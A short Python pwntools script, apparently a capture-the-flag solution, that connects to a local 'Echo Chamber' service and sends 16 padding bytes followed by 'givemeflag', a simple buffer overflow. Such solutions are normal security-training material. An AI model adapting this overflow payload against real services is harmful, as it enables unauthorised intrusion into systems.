#!/usr/bin/env python3

from pwn import *

def main():
    t = remote("localhost", 5000)
    t.sendlineafter("Welcome to the Echo Chamber\n", b"A" * 16 + b"givemeflag")
    t.interactive()
    return

if __name__ == "__main__":
    main()
